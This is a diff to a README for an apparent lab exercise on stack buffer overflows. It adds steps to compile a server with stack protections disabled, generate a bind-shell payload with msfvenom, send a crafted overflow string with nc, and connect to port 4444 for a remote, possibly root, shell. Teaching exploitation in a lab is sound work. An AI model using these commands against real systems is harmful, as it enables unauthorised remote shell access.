@@ -52,4 +52,29 @@ The second exercise consists in overwrite the `%eip` register of the stack in or
 ```
     keep in mind that the intel cpu are Little Endian so pay attention when insert the register
 # Third Exercise
-    TO DO
+The third exercise consists in overwrite the `%eip` register of the stack and fill up the buffer with a shellcode in order to spawn a remote shell possibly with root privileges
+## Compilation server
+```bash
+    cd /path/to/repo/src
+    gcc -O0 -m32 -z execstack -fno-stack-protector -mpreferred-stack-boundary=2 -g p4-server.c -o p4-server
+```
+
+## Create a shellcode using msfvenom
+```bash
+    msfvenom -p linux/x86/shell_bind_tcp AppendExit=true -e x86/alpha_mixed -f python
+```
+## Execution server
+```bash
+    cd /path/to/repo/src
+    ./p4-server
+```
+
+## Execution Client
+```bash
+    ./generate_malicious_string > string
+    nc <server_port> 4001 < string 
+    to generate the malicious string use the buffer output of the previous command and the %eip register found using the debugger
+
+    nc <server_port> 4444 
+    here's your remote shell :)
+```
